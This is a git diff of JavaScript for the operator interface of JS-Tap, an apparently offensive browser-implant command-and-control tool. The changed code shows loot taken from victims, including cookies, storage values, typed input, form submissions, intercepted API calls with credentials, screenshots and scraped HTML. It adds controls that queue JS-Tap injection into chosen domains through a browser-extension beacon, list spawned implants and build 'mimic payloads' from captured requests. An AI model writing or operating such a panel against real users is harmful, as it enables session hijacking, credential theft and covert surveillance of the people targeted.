@@ -1,4 +1,7 @@
 let selectedClientId = "";
+let lastSelectedAppId = "";
+let lastSelectedBrowserId = "";
+let refreshingDetails = false;
 let tokenUrl         = "";
 let tokenLocation    = "";
 let tokenKey         = "";
@@ -2080,303 +2083,524 @@ function showGuideModal()
 
 
 
+async function toggleDomainDetails(domainID, btnElement) {
+	var detailsArea = document.getElementById('domain-details-' + domainID);
+
+	if (detailsArea.style.display !== 'none') {
+		// Already open, close it
+		detailsArea.innerHTML = '';
+        detailsArea.style.display = 'none';
+		btnElement.textContent = 'View Details';
+		return;
+	}
+
+	btnElement.textContent = 'Hide Details';
+    detailsArea.style.display = 'block';
+	
+    // Tab Headers
+    detailsArea.innerHTML = `
+        <ul class="nav nav-tabs" id="tab-${domainID}" role="tablist">
+            <li class="nav-item" role="presentation">
+                <button class="nav-link active" id="history-tab-${domainID}" data-bs-toggle="tab" data-bs-target="#history-content-${domainID}" type="button" role="tab" aria-selected="true">History</button>
+            </li>
+            <li class="nav-item" role="presentation">
+                <button class="nav-link" id="captures-tab-${domainID}" data-bs-toggle="tab" data-bs-target="#captures-content-${domainID}" type="button" role="tab" aria-selected="false">Captures</button>
+            </li>
+        </ul>
+        <div class="tab-content border border-top-0 p-3" id="tabContent-${domainID}">
+            <div class="tab-pane fade show active" id="history-content-${domainID}" role="tabpanel">
+                <div class="d-flex justify-content-center"><div class="spinner-border spinner-border-sm" role="status"></div>&nbsp;Loading history...</div>
+            </div>
+            <div class="tab-pane fade" id="captures-content-${domainID}" role="tabpanel">
+                <div class="d-flex justify-content-center"><div class="spinner-border spinner-border-sm" role="status"></div>&nbsp;Loading captures...</div>
+            </div>
+        </div>
+    `;
+
+    // Fetch History
+    try {
+		var visitResp = await fetch('/api/bex/visits/' + domainID);
+		var visits = await visitResp.json();
+        var historyContent = document.getElementById('history-content-' + domainID);
+
+		if (visits.length === 0) {
+			historyContent.innerHTML = '<div class="alert alert-secondary">No visit history found.</div>';
+		} else {
+            var timelineHtml = '<ul class="list-group list-group-flush">';
+            for (let v of visits) {
+                timelineHtml += `
+                    <li class="list-group-item d-flex justify-content-between align-items-start">
+                        <div class="ms-2 me-auto text-break" style="font-family: monospace; font-size: 0.9em;">
+                            ${escapeHTML(v.url)}
+                        </div>
+                        <span class="badge bg-light text-dark rounded-pill">${humanized_time_span(v.visitTime)}</span>
+                    </li>
+                `;
+            }
+            timelineHtml += '</ul>';
+            historyContent.innerHTML = timelineHtml;
+        }
+    } catch (e) {
+        document.getElementById('history-content-' + domainID).innerHTML = '<div class="alert alert-danger">Error loading history.</div>';
+    }
+
+
+    // Fetch Captures
+	try {
+		var resp = await fetch('/api/bex/captures/' + domainID);
+		var captures = await resp.json();
+        var captureContent = document.getElementById('captures-content-' + domainID);
+
+		if (captures.length === 0) {
+			captureContent.innerHTML = '<div class="alert alert-secondary">No captures found for this domain.</div>';
+		} else {
+			var tableHtml = `
+				<div class="table-responsive">
+					<table class="table table-sm table-striped table-bordered">
+						<thead class="table-light">
+							<tr>
+								<th>Type</th>
+								<th>Name</th>
+								<th>Value</th>
+							</tr>
+						</thead>
+						<tbody>
+			`;
+			
+			for (let c of captures) {
+				tableHtml += `
+					<tr>
+						<td><span class="badge bg-secondary">${escapeHTML(c.type)}</span></td>
+						<td>${escapeHTML(c.name)}</td>
+						<td style="word-break: break-all; font-family: monospace; font-size: 0.9em;">${escapeHTML(c.value)}</td>
+					</tr>
+				`;
+			}
+			tableHtml += `</tbody></table></div>`;
+			captureContent.innerHTML = tableHtml;
+		}
+	} catch (e) {
+		captureContent.innerHTML = '<div class="alert alert-danger">Error loading captures.</div>';
+	}
+}
+
+
+async function toggleBexInjection(beaconID, domain, isActive) {
+    if (isActive) {
+        if (confirm('Stop injecting JS-Tap into ' + domain + '?')) {
+            await fetch('/api/bex/stop_inject', {
+                method: 'POST',
+                body: JSON.stringify({ beaconID: beaconID, domain: domain }),
+                headers: { "Content-type": "application/json; charset=UTF-8" }
+            });
+            getClientDetails(beaconID); // Refresh
+        }
+    } else {
+        var tag = prompt("Enter a tag for the injected client:", "bex-injected");
+        if (tag) {
+            await fetch('/api/bex/inject', {
+                method: 'POST',
+                body: JSON.stringify({ beaconID: beaconID, domain: domain, tag: tag }),
+                headers: { "Content-type": "application/json; charset=UTF-8" }
+            });
+            // alert("Injection queued. It will start on the next beacon heartbeat.");
+            getClientDetails(beaconID); // Refresh
+        }
+    }
+}
+
+
 async function getClientDetails(id) 
 {
-	// console.log("** Fetching details for client: " + id);
-
-	// Get high level event stack for client
-	var req = await fetch('/api/clientEvents/' + id);
-	var jsonResponse = await req.json();
-
-	// Start setting up our cards
-	var cardStack = document.getElementById('detail-stack');
-
-
-	// Let's get event details for each event
-	for (let i = 0; i < jsonResponse.length; i++)
-	{
-		event = jsonResponse[i];
-		var eventKey = event.eventID;
-
-		var card = document.createElement('div');
-		card.className ='card';
-
-		var cardBody = document.createElement('div');
-		cardBody.className = 'card-body';
-
-		var cardTitle = document.createElement('h5');
-		cardTitle.className = "card-title";
-
-		var cardSubtitle = document.createElement('h6');
-
-		// Add tooltip
-		cardSubtitle.className = "card-subtitle mb-2 text-muted";
-		cardSubtitle.setAttribute("data-toggle", "tooltip")
-		cardSubtitle.setAttribute("title", event.timeStamp);
-		cardSubtitle.setAttribute("data-placement", "left");
-		const tooltipOptions = {
-    	animation: true, // Optional: Enable tooltip animation
-      delay: { show: 300, hide: 100 }, // Optional: Set tooltip show/hide delay in milliseconds
-      container: cardSubtitle // Optional: Specify a container for the tooltip
-  };
-  new bootstrap.Tooltip(cardSubtitle, tooltipOptions);
-
-
-  var cardText = document.createElement('p');
-  cardText.className = 'card-text';
-
-  var activeEvent = false;
-
-
-		// Handle event specific details and formatting
-  switch(event.eventType)
-  {
-  case 'COOKIE':
-  	if (document.getElementById('cookieEvents').checked == true)
-  	{
-  		activeEvent = true;
-  		cookieReq  = await fetch('/api/clientCookie/' + eventKey);
-  		cookieJson = await cookieReq.json();
-
-  		cardTitle.innerHTML = "Cookie";
-  		cardText.innerHTML  = "Cookie Name: <b>" + cookieJson.cookieName + "</b>";
-  		cardText.innerHTML += "<br>";
-  		cardText.innerHTML += "Cookie Value: <b>" + cookieJson.cookieValue + "</b>";
-  	}
-  	break;
-
-  case 'LOCALSTORAGE':
-  	if (document.getElementById('localStorageEvents').checked == true)
-  	{
-  		activeEvent = true;
-  		localStorageReq  = await fetch('/api/clientLocalStorage/' + eventKey);
-  		localStorageJson = await localStorageReq.json();
-
-			// console.log("*** Local storage api call received: ");
-			// console.log(JSON.stringify(localStorageJson));
-
-  		cardTitle.innerHTML = "Local Storage";
-  		cardText.innerHTML  = "Key: <b>" + localStorageJson.localStorageKey + "</b>";
-  		cardText.innerHTML += "<br>";
-  		cardText.innerHTML += "Value: <b>" + localStorageJson.localStorageValue + "</b>";
-  	}
-  	break;
-
-  case 'SESSIONSTORAGE':
-  	if (document.getElementById('sessionStorageEvents').checked == true)
-  	{
-  		activeEvent = true;
-  		sessionStorageReq  = await fetch('/api/clientSessionStorage/' + eventKey);
-  		sessiontorageJson  = await sessionStorageReq.json();
-
-  		cardTitle.innerHTML = "Session Storage";
-  		cardText.innerHTML  = "Key: <b>" + sessiontorageJson.sessionStorageKey + "</b>";
-  		cardText.innerHTML += "<br>";
-  		cardText.innerHTML += "Value: <b>" + sessiontorageJson.sessionStorageValue + "</b>";
-  	}
-  	break;
-
-  case 'URLVISITED':
-  	if (document.getElementById('urlEvents').checked == true)
-  	{
-  		activeEvent = true;
-  		urlVisitedReq  = await fetch('/api/clientUrl/' + eventKey);
-  		urlVisitedJson = await urlVisitedReq.json();
-
-  		cardTitle.innerHTML = "<u>URL Visited</u>";
-  		cardText.innerHTML  = "URL: <b>" + urlVisitedJson.url + "</b>";
-  	}
-  	break;
-
-  case 'HTML':
-  	if (document.getElementById('htmlScrapeEvents').checked == true)
-  	{
-  		activeEvent = true;
-  		htmlScrapeReq  = await fetch('/api/clientHtml/' + eventKey);
-  		htmlScrapeJson = await htmlScrapeReq.json();
-
-  		cardTitle.innerHTML = "HTML Scraped";
-  		cardText.innerHTML  = "URL: <b>" + htmlScrapeJson.url + "</b><br><br>";
-  		cardText.innerHTML += '<button type="button" class="btn btn-primary" onclick="showHtmlCode(' + eventKey + ')">View Code</button>';
-  		cardText.innerHTML += '&nbsp;<button type="button" class="btn btn-primary" onclick=downloadHtmlCode(' + `'` + htmlScrapeJson.fileName + `'`+ ')>Download Code</button>';
-  	}
-  	break;
-
-  case 'SCREENSHOT':
-  	if (document.getElementById('screenshotEvents').checked == true)
-  	{
-  		activeEvent = true;
-  		screenshotReq  = await fetch('/api/clientScreenshot/' + eventKey);
-  		screenshotJson = await screenshotReq.json();
-
-  		cardTitle.innerHTML = "Screenshot Captured";
-  		cardText.innerHTML  = '<a href="'  + screenshotJson.fileName + '" target="_blank"><img src="' + screenshotJson.fileName + '" class="img-thumbnail"></a>';
-  	}
-  	break;
-
-  case 'USERINPUT':
-  	if (document.getElementById('userInputEvents').checked == true)
-  	{
-  		activeEvent = true;
-  		userInputReq  = await fetch('/api/clientUserInput/' + eventKey);
-  		userInputJson = await userInputReq.json();
-
-  		cardTitle.innerHTML = "User Input";
-  		cardText.innerHTML  = "Input Name: <b>" + userInputJson.inputName + "</b>";
-  		cardText.innerHTML += "<br>";
-  		cardText.innerHTML += "Typed Value: <b>" + userInputJson.inputValue + "</b>";
-  	}
-  	break;
-
-
-  case 'XHRAPICALL':
-  	if (document.getElementById('apiEvents').checked == true)
-  	{
-  		activeEvent = true;
-  		xhrApiCallReq  = await fetch('/api/clientXhrApiCall/' + eventKey);
-  		xhrApiCallJson = await xhrApiCallReq.json();
-
-
-  		cardTitle.innerHTML = "Network - XHR API Call";
-
-  		// Show basics
-  		cardText.innerHTML  = "URL: <b>" + xhrApiCallJson.url + "</b>";
-  		cardText.innerHTML += "<br>";
-  		cardText.innerHTML += "Method: <b>" + xhrApiCallJson.method + "</b>";
-  		cardText.innerHTML += "<br>";
-  		cardText.innerHTML += "Basic Auth: <b>" + xhrApiCallJson.user + ':' + xhrApiCallJson.password + "</b>";
-  		cardText.innerHTML += "<br>";
-  		cardText.innerHTML += "<br>";
-  		cardText.innerHTML += "Headers:";
-  		cardText.innerHTML += "<br>";
-
-  		xhrApiCallJson.headers.forEach(header => {
-  			cardText.innerHTML += "<b>" + escapeHTML(header.header) + ":" + escapeHTML(header.value) + "</b>";
-  			cardText.innerHTML += "<br>";
-  		});
-
-  		cardText.innerHTML += "<br>";
-  		cardText.innerHTML += "Response Status: <b>" + xhrApiCallJson.responseStatus + "</b>";
-  		cardText.innerHTML += "<br>";
-  		cardText.innerHTML += "<br>";
-
-  		cardText.innerHTML += '<br><button type="button" class="btn btn-primary" onclick=showReqRespViewer(' 
-  		+ eventKey + ',"XHR")>View API Call</button>';
-
-  		jsonDataString = JSON.stringify(xhrApiCallJson).replace(/"/g, '&quot;');
-  		cardText.innerHTML += `&nbsp;<button type="button" class="btn btn-primary" onclick="showMimicApiModal('${eventKey}', '${jsonDataString}', 'XHR')">Create Mimic Payload</button>`;
-  	}
-  	break;
-
-
-  case 'FETCHAPICALL':
-  	if (document.getElementById('apiEvents').checked == true)
-  	{
-  		activeEvent = true;
-  		fetchApiCallReq  = await fetch('/api/clientFetchApiCall/' + eventKey);
-  		fetchApiCallJson = await fetchApiCallReq.json();
-
-
-  		cardTitle.innerHTML = "Network - Fetch API Call";
-
-  		// Show basics
-  		cardText.innerHTML  = "URL: <b>" + fetchApiCallJson.url + "</b>";
-  		cardText.innerHTML += "<br>";
-  		cardText.innerHTML += "Method: <b>" + fetchApiCallJson.method + "</b>";
-  		cardText.innerHTML += "<br>";
-  		cardText.innerHTML += "<br>";
-  		cardText.innerHTML += "Headers:";
-  		cardText.innerHTML += "<br>";
-
-  		fetchApiCallJson.headers.forEach(header => {
-  			cardText.innerHTML += "<b>" + escapeHTML(header.header) + ":" + escapeHTML(header.value) + "</b>";
-  			cardText.innerHTML += "<br>";
-  		});
-
-  		cardText.innerHTML += "<br>";
-  		cardText.innerHTML += "Response Status: <b>" + fetchApiCallJson.responseStatus + "</b>";
-
-  		cardText.innerHTML += "<br>";
-  		cardText.innerHTML += "<br>";
-
-  		cardText.innerHTML += '<br><button type="button" class="btn btn-primary" onclick=showReqRespViewer(' 
-  		+ eventKey + ',"FETCH")>View API Call</button>';
-
-  		jsonDataString = JSON.stringify(fetchApiCallJson).replace(/"/g, '&quot;');
-  		cardText.innerHTML += `&nbsp;<button type="button" class="btn btn-primary" onclick="showMimicApiModal('${eventKey}', '${jsonDataString}', 'FETCH')">Create Mimic Payload</button>`;
-  	}
-  	break;
-
-
-
-  case 'FORMPOST':
-  	if (document.getElementById('formPostEvents').checked == true)
-  	{
-  		activeEvent = true;
-  		// fetch the data from the api
-  		formPostReq  = await fetch('/api/clientFormPosts/' + eventKey);
-  		formPostJson = await formPostReq.json();
-
-  		formData       = escapeHTML(atob(formPostJson.data));
-  		splitFormData  = formData.split('\n');
-
-  		cardTitle.innerHTML = "Network Form Submission";
-  		cardText.innerHTML += "URL: <b>" + escapeHTML(formPostJson.url) + "</b>";
-  		cardText.innerHTML += "<br>";
-  		cardText.innerHTML += "Action: <b>" + escapeHTML(atob(formPostJson.action)) + "</b>";
-  		cardText.innerHTML += "<br>";
-  		cardText.innerHTML += "Method: <b>" + escapeHTML(formPostJson.method) + "</b>";
-  		cardText.innerHTML += "<br>";
-  		cardText.innerHTML += "Data:";
-  		cardText.innerHTML += "<br>";
-  		cardText.innerHTML += splitFormData.map(line => "<b>" + line + "</b>").join("<br>");
-  		cardText.innerHTML += "<br>";
-
-  		jsonDataString = JSON.stringify(formPostJson).replace(/"/g, '&quot;');
-  		cardText.innerHTML += `<button type="button" class="btn btn-primary" onclick="showMimicFormModal('${eventKey}', '${jsonDataString}')">Create Mimic Payload</button>`;
-  	}
-  	break;
-
-
-  case 'CUSTOMEXFIL':
-  	if (document.getElementById('customExfilEvents').checked == true)
-  	{
-  		activeEvent = true;
-
-  		// fetch the data from the api
-  		customExfilReq  = await fetch('/api/clientCustomExfilNote/' + eventKey);
-  		customExfilJson = await customExfilReq.json();
-
-  		note = escapeHTML(atob(customExfilJson.note));
-
-  		cardTitle.innerHTML = "Custom Payload Exfiltrated Data";
-  		cardText.innerHTML += "Note: <br>";
-  		cardText.innerHTML += "<b>" + note + "</b><br><br>";
-  		cardText.innerHTML += '<button type="button" class="btn btn-primary" onclick="showExfilViewer(' + eventKey + ')">View Exfiltrated Data</button>';
-  	}
-  	break;
-
-
-  default:
-  	alert('!!!!Switch default-No good');
-  }
-
-
-    // Only need the bottom part of the card
-    // if the event in the loop is active
-  if (activeEvent)
-  {
-  	cardSubtitle.innerHTML = humanized_time_span(event.timeStamp);
-
-  	cardBody.appendChild(cardTitle);
-  	cardBody.appendChild(cardSubtitle);
-  	cardBody.appendChild(cardText);
-
-  	card.appendChild(cardBody);
-
-  	cardStack.appendChild(card);    	
-  }
-}
+    if (refreshingDetails) return;
+    refreshingDetails = true;
+
+    try {
+        // Get client info to check type
+        var clientsReq = await fetch('/api/getClients');
+        var clients = await clientsReq.json();
+        var client = clients.find(c => c.id == id);
+
+        // Update persistence
+        if (client) {
+            if (client.clientType === 'bex-beacon') {
+                lastSelectedBrowserId = client.id;
+            } else {
+                lastSelectedAppId = client.id;
+            }
+        }
+
+        var cardStack = document.getElementById('detail-stack');
+        const lootHeader = document.getElementById('loot-header-text');
+        
+        // Save scroll position
+        const scrollPos = cardStack.scrollTop;
+
+        // Update Header Label based on the ACTUAL client being loaded
+        if (client && lootHeader) {
+            const label = client.clientType === 'bex-beacon' ? "Browser Loot" : "App Loot";
+            lootHeader.innerHTML = `<b>&nbsp;&nbsp;${label}</b>`;
+        }
+
+        // Only clear if we are switching to a brand NEW client (not a refresh)
+        // If we are refreshing the same client, we want to update in-place to avoid flashing
+        const isRefresh = (cardStack.getAttribute('data-loaded-id') == id);
+        
+        if (!isRefresh) {
+            while (cardStack.firstChild) {
+                cardStack.firstChild.remove();
+            }
+            cardStack.setAttribute('data-loaded-id', id);
+        }
+
+        if (client && client.clientType === 'bex-beacon') {
+            // Handle Beacon View
+            var domainsReq = await fetch('/api/bex/domains/' + id);
+            var domains = await domainsReq.json();
+            
+            // Fetch active injections
+            var injectionsReq = await fetch('/api/bex/injections/' + id);
+            var injections = await injectionsReq.json();
+            var activeMap = {};
+            injections.forEach(i => activeMap[i.domain] = { tag: i.tag, success: i.last_success });
+
+            // Get all clients to find children
+            var children = clients.filter(c => c.parentUUID === client.uuid);
+
+            if (domains.length === 0) {
+                cardStack.innerHTML = `
+                    <div class="mt-4 p-5 bg-dark text-white rounded text-center">
+                        <h3>No Domains Recorded</h3>
+                        <p class="text-white-50">This beacon has not reported any domain intelligence yet.</p>
+                    </div>
+                `;
+                return;
+            }
+
+            // Sort domains by last seen (most recent first)
+            domains.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
+
+            for (let d of domains) {
+                // Look for existing card to update in-place
+                let card = document.getElementById('domain-card-' + d.id);
+                let isNew = false;
+
+                if (!card) {
+                    isNew = true;
+                    card = document.createElement('div');
+                    card.className = 'card mb-2';
+                    card.id = 'domain-card-' + d.id;
+                    card.innerHTML = `
+                        <div class="card-body">
+                            <div class="header-area d-flex justify-content-between align-items-center mb-2"></div>
+                            <div class="stats-area mb-2 text-muted small"></div>
+                            <div class="controls-area d-flex justify-content-start gap-2 mb-3"></div>
+                            <div class="children-area"></div>
+                            <div class="details-area mt-3" style="display: none;" id="domain-details-${d.id}"></div>
+                        </div>
+                    `;
+                }
+
+                const headerArea = card.querySelector('.header-area');
+                const statsArea = card.querySelector('.stats-area');
+                const controlsArea = card.querySelector('.controls-area');
+                const childrenArea = card.querySelector('.children-area');
+
+                // 1. Update Header (Title + Badges)
+                let badgeHtml = '';
+                if (activeMap[d.domain]) {
+                    const info = activeMap[d.domain];
+                    const statusColor = info.success ? 'bg-success' : 'bg-warning text-dark';
+                    const childForDomain = children.find(c => c.tag === info.tag);
+                    const name = childForDomain ? (childForDomain.tag ? `${childForDomain.tag}/${childForDomain.nickname}` : childForDomain.nickname) : null;
+                    const nicknameSuffix = name ? ` (${escapeHTML(name)})` : '';
+                    const statusText  = info.success ? `SUCCESS: ${escapeHTML(info.tag)}${nicknameSuffix}` : `INJECTING: ${escapeHTML(info.tag)}`;
+                    badgeHtml = `<span class="badge ${statusColor}" style="font-size: 0.6em; vertical-align: middle;">${statusText}</span>`;
+                }
+                headerArea.innerHTML = `<h5 class="card-title mb-0"><b>${escapeHTML(d.domain)}</b> ${badgeHtml}</h5>
+                                        <small class="text-muted">Last Seen: ${humanized_time_span(d.lastSeen)}</small>`;
+
+                // 2. Update Stats
+                statsArea.innerHTML = `Visits: <b>${d.visitCount}</b>` + 
+                    (d.lastUrl ? ` &bull; Last URL: <span class="text-truncate d-inline-block" style="max-width: 300px; vertical-align: bottom;" title="${escapeHTML(d.lastUrl)}">${escapeHTML(d.lastUrl)}</span>` : '');
+
+                // 3. Update Controls (Only if state changed or new)
+                const currentActionText = activeMap[d.domain] ? 'Stop Injection' : 'Inject JS-Tap';
+                const currentActionClass = activeMap[d.domain] ? 'btn-outline-danger' : 'btn-outline-success';
+                
+                if (isNew || !controlsArea.querySelector(`.${currentActionClass}`)) {
+                    controlsArea.innerHTML = '';
+                    
+                    const injectBtn = document.createElement('button');
+                    injectBtn.style.minWidth = "120px";
+                    injectBtn.className = `btn ${currentActionClass} btn-sm`;
+                    injectBtn.textContent = currentActionText;
+                    injectBtn.onclick = function() { toggleBexInjection(id, d.domain, !!activeMap[d.domain]); };
+                    controlsArea.appendChild(injectBtn);
+
+                    const captureBtn = document.createElement('button');
+                    captureBtn.style.minWidth = "120px";
+                    captureBtn.className = 'btn btn-primary btn-sm';
+                    captureBtn.textContent = 'View Details';
+                    captureBtn.onclick = function() { toggleDomainDetails(d.id, this); };
+                    controlsArea.appendChild(captureBtn);
+                }
+
+                // 4. Update Children Summary
+                const domainChildren = activeMap[d.domain] ? children.filter(c => c.tag === activeMap[d.domain].tag) : [];
+                if (domainChildren.length > 0) {
+                    childrenArea.className = 'children-area mt-2 border-top pt-2';
+                    childrenArea.innerHTML = `<small class="text-muted">Spawned Implants:</small>`;
+                    domainChildren.forEach(child => {
+                        const badge = document.createElement('div');
+                        badge.className = 'badge bg-dark text-white me-1 p-1';
+                        badge.style.cursor = 'pointer';
+                        const name = child.tag ? `${escapeHTML(child.tag)}/${escapeHTML(child.nickname)}` : escapeHTML(child.nickname);
+                        badge.innerHTML = `<small>${name}</small>`;
+                        badge.onclick = (e) => {
+                            e.stopPropagation();
+                            document.getElementById('toggleApps').click();
+                            setTimeout(() => {
+                                const childCard = document.getElementById('clientCard' + child.id);
+                                if (childCard) childCard.click();
+                            }, 100);
+                        };
+                        childrenArea.appendChild(badge);
+                    });
+                } else {
+                    childrenArea.innerHTML = '';
+                    childrenArea.className = 'children-area';
+                }
+
+                if (isNew) {
+                    cardStack.appendChild(card);
+                }
+            }
+            // Restore scroll position
+            if (scrollPos > 0) {
+                cardStack.scrollTop = scrollPos;
+            }
+            return;
+        }
+
+        // Get high level event stack for client (Standard Implant)
+        var req = await fetch('/api/clientEvents/' + id);
+        var jsonResponse = await req.json();
+
+
+        // Let's get event details for each event
+        for (let i = 0; i < jsonResponse.length; i++)
+        {
+            event = jsonResponse[i];
+            var eventKey = event.eventID;
+
+            var card = document.createElement('div');
+            card.className ='card';
+
+            var cardBody = document.createElement('div');
+            cardBody.className = 'card-body';
+
+            var cardTitle = document.createElement('h5');
+            cardTitle.className = "card-title";
+
+            var cardSubtitle = document.createElement('h6');
+
+            // Add tooltip
+            cardSubtitle.className = "card-subtitle mb-2 text-muted";
+            cardSubtitle.setAttribute("data-toggle", "tooltip")
+            cardSubtitle.setAttribute("title", event.timeStamp);
+            cardSubtitle.setAttribute("data-placement", "left");
+            const tooltipOptions = {
+            animation: true, // Optional: Enable tooltip animation
+            delay: { show: 300, hide: 100 }, // Optional: Set tooltip show/hide delay in milliseconds
+            container: cardSubtitle // Optional: Specify a container for the tooltip
+        };
+        new bootstrap.Tooltip(cardSubtitle, tooltipOptions);
+
+
+        var cardText = document.createElement('p');
+        cardText.className = 'card-text';
+
+        var activeEvent = false;
+
+
+            // Handle event specific details and formatting
+        switch(event.eventType)
+        {
+        case 'COOKIE':
+            if (document.getElementById('cookieEvents').checked == true)
+            {
+                activeEvent = true;
+                cookieReq  = await fetch('/api/clientCookie/' + eventKey);
+                cookieJson = await cookieReq.json();
+
+                cardTitle.innerHTML = "Cookie";
+                cardText.innerHTML  = "Cookie Name: <b>" + cookieJson.cookieName + "</b>";
+                cardText.innerHTML += "<br>";
+                cardText.innerHTML += "Cookie Value: <b>" + cookieJson.cookieValue + "</b>";
+            }
+            break;
+
+        case 'LOCALSTORAGE':
+            if (document.getElementById('localStorageEvents').checked == true)
+            {
+                activeEvent = true;
+                localStorageReq  = await fetch('/api/clientLocalStorage/' + eventKey);
+                localStorageJson = await localStorageReq.json();
+
+                // console.log("*** Local storage api call received: ");
+                // console.log(JSON.stringify(localStorageJson));
+                cardTitle.innerHTML = "Local Storage";
+                cardText.innerHTML  = "Key: <b>" + localStorageJson.localStorageKey + "</b>";
+                cardText.innerHTML += "<br>";
+                cardText.innerHTML += "Value: <b>" + localStorageJson.localStorageValue + "</b>";
+            }
+            break;
+
+        case 'SESSIONSTORAGE':
+            if (document.getElementById('sessionStorageEvents').checked == true)
+            {
+                activeEvent = true;
+                sessionStorageReq  = await fetch('/api/clientSessionStorage/' + eventKey);
+                sessionStorageJson = await sessionStorageReq.json();
+
+                cardTitle.innerHTML = "Session Storage";
+                cardText.innerHTML  = "Key: <b>" + sessionStorageJson.sessionStorageKey + "</b>";
+                cardText.innerHTML += "<br>";
+                cardText.innerHTML += "Value: <b>" + sessionStorageJson.sessionStorageValue + "</b>";
+            }
+            break;
+
+        case 'URLVISITED':
+            if (document.getElementById('urlEvents').checked == true)
+            {
+                activeEvent = true;
+                urlVisitedReq  = await fetch('/api/clientUrl/' + eventKey);
+                urlVisitedJson = await urlVisitedReq.json();
+
+                cardTitle.innerHTML = "URL Visited";
+                cardText.innerHTML  = "URL: <b>" + urlVisitedJson.url + "</b>";
+            }
+            break;
+
+        case 'HTML':
+            if (document.getElementById('htmlScrapeEvents').checked == true)
+            {
+                activeEvent = true;
+                cardTitle.innerHTML = "HTML Scraped";
+                cardText.innerHTML  = "HTML exfiltrated from page.<br><br>";
+                cardText.innerHTML += '<button type="button" class="btn btn-primary" onclick=showHtmlCode(' + `'` + eventKey + `'`+ ')>View Code</button>';
+            }
+            break;
+
+        case 'SCREENSHOT':
+            if (document.getElementById('screenshotEvents').checked == true)
+            {
+                activeEvent = true;
+                screenshotReq  = await fetch('/api/clientScreenshot/' + eventKey);
+                screenshotJson = await screenshotReq.json();
+
+                cardTitle.innerHTML = "Screenshot";
+                cardText.innerHTML  = '<img src="' + screenshotJson.fileName + '" class="img-fluid" alt="Responsive image">';
+            }
+            break;
+
+        case 'USERINPUT':
+            if (document.getElementById('userInputEvents').checked == true)
+            {
+                activeEvent = true;
+                userInputReq  = await fetch('/api/clientUserInput/' + eventKey);
+                userInputJson = await userInputReq.json();
+
+                cardTitle.innerHTML = "User Input";
+                cardText.innerHTML  = "Input Name: <b>" + userInputJson.inputName + "</b>";
+                cardText.innerHTML += "<br>";
+                cardText.innerHTML += "Input Value: <b>" + userInputJson.inputValue + "</b>";
+            }
+            break;
+
+        case 'FORMPOST':
+            if (document.getElementById('formPostEvents').checked == true)
+            {
+                activeEvent = true;
+                formPostReq  = await fetch('/api/clientFormPostDetail/' + eventKey);
+                formPostJson = await formPostReq.json();
+
+                cardTitle.innerHTML = "Network Form Submission";
+                cardText.innerHTML  = "Form submission intercepted from browser networking API.<br><br>";
+                cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm me-2" onclick=showExfilViewer(' + `'` + eventKey + `'`+ ')>View Submission</button>';
+                cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" onclick=showMimicFormModal(' + `'` + eventKey + `','` + JSON.stringify(formPostJson) + `'` + ')>Create Mimic Payload</button>';
+            }
+            break;
+
+        case 'XHRAPICALL':
+            if (document.getElementById('apiEvents').checked == true)
+            {
+                activeEvent = true;
+                xhrCallReq  = await fetch('/api/clientXhrApiCall/' + eventKey);
+                xhrCallJson = await xhrCallReq.json();
+
+                cardTitle.innerHTML = "Network API Call (XHR)";
+                cardText.innerHTML  = "Network API call intercepted via XHR monkeypatching.<br><br>";
+                cardText.innerHTML += "URL: <b>" + xhrCallJson.url + "</b><br>";
+                cardText.innerHTML += "Method: <b>" + xhrCallJson.method + "</b><br>";
+                cardText.innerHTML += "Status Code: <b>" + xhrCallJson.responseStatus + "</b><br><br>";
+                cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm me-2" onclick=showReqRespViewer(' + `'` + eventKey + `','XHR'`+ ')>View Details</button>';
+                cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" onclick=showMimicApiModal(' + `'` + eventKey + `','` + JSON.stringify(xhrCallJson) + `','XHR'` + ')>Create Mimic Payload</button>';
+            }
+            break;
+
+        case 'FETCHAPICALL':
+            if (document.getElementById('apiEvents').checked == true)
+            {
+                activeEvent = true;
+                fetchCallReq  = await fetch('/api/clientFetchApiCall/' + eventKey);
+                fetchCallJson = await fetchCallReq.json();
+
+                cardTitle.innerHTML = "Network API Call (Fetch)";
+                cardText.innerHTML  = "Network API call intercepted via Fetch monkeypatching.<br><br>";
+                cardText.innerHTML += "URL: <b>" + fetchCallJson.url + "</b><br>";
+                cardText.innerHTML += "Method: <b>" + fetchCallJson.method + "</b><br>";
+                cardText.innerHTML += "Status Code: <b>" + fetchCallJson.responseStatus + "</b><br><br>";
+                cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm me-2" onclick=showReqRespViewer(' + `'` + eventKey + `','FETCH'`+ ')>View Details</button>';
+                cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" onclick=showMimicApiModal(' + `'` + eventKey + `','` + JSON.stringify(fetchCallJson) + `','FETCH'` + ')>Create Mimic Payload</button>';
+            }
+            break;
+
+        case 'CUSTOMEXFIL':
+            if (document.getElementById('customExfilEvents').checked == true)
+            {
+                activeEvent = true;
+                cardTitle.innerHTML = "Custom Payload Exfiltrated Data";
+                cardText.innerHTML  = "Data sent back from a custom C2 payload.<br><br>";
+                cardText.innerHTML += '<button type="button" class="btn btn-primary" onclick=showExfilViewer(' + `'` + eventKey + `'`+ ')>View Data</button>';
+            }
+            break;
+
+        default:
+            console.log("Error: unknown event type received from server: " + event.eventType);
+        }
+
+
+        if (activeEvent)
+        {
+            cardSubtitle.innerHTML  = "Event Time: <b>" + humanized_time_span(event.timeStamp) + "</b>";
+
+            cardBody.appendChild(cardTitle);
+            cardBody.appendChild(cardSubtitle);
+            cardBody.appendChild(cardText);
+
+            card.appendChild(cardBody);
+            cardStack.appendChild(card);
+        }
+        }
+        // Restore scroll position
+        if (scrollPos > 0) {
+            cardStack.scrollTop = scrollPos;
+        }
+    } finally {
+        refreshingDetails = false;
+    }
 }
 
 
@@ -2387,6 +2611,8 @@ function unselectAllClients()
 {
 	// Remove detail cards
 	detailCardStack = document.getElementById('detail-stack');
+	detailCardStack.classList.remove('ghost-loot');
+
 	while (detailCardStack.firstChild)
 	{
 		detailCardStack.firstChild.remove();
@@ -2555,6 +2781,14 @@ async function updateClients()
 	var fingerprintReq  = await fetch('/api/app/getShowFingerprintSetting');
 	var fingerprintJson = await fingerprintReq.json();
 
+    // Update Navbar Stats
